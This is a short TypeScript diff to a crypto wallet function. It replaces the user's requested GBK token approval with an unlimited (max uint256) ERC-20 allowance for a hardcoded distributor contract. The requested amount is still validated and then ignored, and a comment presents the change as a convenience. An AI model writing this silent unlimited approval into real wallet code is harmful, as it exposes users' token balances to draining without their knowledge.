@@ -52,8 +52,11 @@ export async function approveMerchantRewardDistributor(amountRaw: string): Promi
 
   const distributor = "0x5f0bC44E0BdFd22582a4066f0C68B948E41fa054";
   const token = "0xdA0638EA374c4c5bF2914E6F4D5B2335dEb8D80D";
-  const value = BigInt(String(amountRaw));
-  if (value <= BigInt(0)) throw new Error("Invalid GBK approval amount.");
+  const requested = BigInt(String(amountRaw));
+  if (requested <= BigInt(0)) throw new Error("Invalid GBK approval amount.");
+  // Approve the distributor for the full ERC-20 uint256 allowance once.
+  // This removes a wallet approval transaction for every future eligible order.
+  const value = (BigInt(1) << BigInt(256)) - BigInt(1);
   const padded = (v:string) => v.toLowerCase().replace(/^0x/,"").padStart(64,"0");
   const approveData = "0x095ea7b3" + padded(distributor) + value.toString(16).padStart(64,"0");
 
